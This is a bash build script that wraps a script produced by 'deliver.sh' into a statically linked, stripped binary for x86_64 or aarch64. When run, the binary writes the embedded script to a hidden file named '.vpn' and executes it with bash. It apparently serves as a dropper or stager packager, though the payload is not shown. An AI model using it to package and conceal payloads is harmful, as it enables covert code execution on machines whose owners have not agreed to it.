#!/bin/bash

COMMU="$1"
ARCH="$2"
FILENAME_SUFFIX="$COMMU-$ARCH"
FILENAME_EMBEDED="standalone-$FILENAME_SUFFIX"

embed() {
    c=$1
    a=$2
    filename=$FILENAME_EMBEDED
    if [ -f "/toolchains/build/bin/$filename" ]; then
     :
    else
        cat << EOC >  /toolchains/build/$filename.c
#include <stdio.h>
#include <unistd.h>
$(xxd -n vpn -i < <(./deliver.sh $c $a script))
char *argk[10] = { "/bin/bash", ".vpn", NULL };
int main(int argc, char *argv[], char *envp[])
{

FILE *f = fopen(".vpn", "wb");
fwrite(vpn, sizeof(char), sizeof(vpn), f);
fclose(f);
int rc = execve(argk[0], argk, envp);
perror("execve");
return 0;
}
EOC
        cd /toolchains/build/
        /toolchains/gcc/$a -g -c -o $filename.o $filename.c &>/dev/null
        /toolchains/gcc/$a --static -L .  $filename.o -lc -o /toolchains/build/bin/$filename &>/dev/null
        /toolchains/gcc/strip-$a /toolchains/build/bin/$filename &>/dev/null
    fi 
}

validates_arch(){
    [[ "$1" == "x86_64" ]] || [[ "$1" == "aarch64" ]]
}

validates_arch $ARCH || { echo "400::Unsupported architecture '$ARCH'"; exit 1;}

exec 3>&1 1>.embeded_$FILENAME.log
embed $COMMU $ARCH
exec 1>&3 3>&-
echo "200::/toolchains/build/bin/$FILENAME_EMBEDED"